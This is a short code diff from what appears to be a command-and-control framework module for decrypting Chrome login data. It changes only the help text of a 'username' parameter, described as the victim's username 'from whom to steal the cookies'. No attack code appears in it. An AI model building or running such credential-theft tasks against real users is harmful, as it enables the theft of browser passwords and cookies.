@@ -24,7 +24,7 @@ class DecryptChromeLoginDatasArguments(TaskArguments):
             CommandParameter(
                 name="username",
                 type=ParameterType.String,
-                description="Victim's username from whom to steal the cookies",
+                description="Victim's username from whom to steal the cookies (used for file descriptions on saved data)",
                 parameter_group_info=[
                     ParameterGroupInfo(
                         required=True,
